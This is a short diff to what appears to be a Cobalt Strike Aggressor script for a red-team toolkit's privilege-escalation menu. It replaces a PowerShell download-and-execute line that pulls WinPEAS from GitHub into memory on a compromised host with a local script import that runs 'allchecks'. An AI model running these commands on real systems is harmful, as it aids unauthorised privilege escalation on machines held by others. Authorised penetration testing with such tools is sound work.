@@ -230,12 +230,14 @@ menu "Priv Escalation" {
 
     }
 
-item "Run WinPEAS" {
-    blog($1, "\c9=========== Run WinPEAS ==========");
+item "WinPEAS" {
+    blog($1, "\c9=========== WinPEAS (Privilege Escalation Awesome Scripts Suite) ==========");
     local('$bid');
     foreach $bid ($1){
-        binput($1, "powershell \"IEX(New-Object Net.WebClient).downloadString('https://raw.githubusercontent.com/carlospolop/PEASS-ng/master/winPEAS/winPEASps1/winPEAS.ps1')\"");
-        bpowershell($1, "IEX(New-Object Net.WebClient).downloadString('https://raw.githubusercontent.com/carlospolop/PEASS-ng/master/winPEAS/winPEASps1/winPEAS.ps1')");
+        binput($1, "powershell-import WinPEAS.ps1");
+        bpowershell_import($1, script_resource("/scripts/InfoCollect/WinPEAS.ps1"));
+        binput($1, "powershell allchecks");
+        bpowershell($1, "allchecks");
     }
 }
 
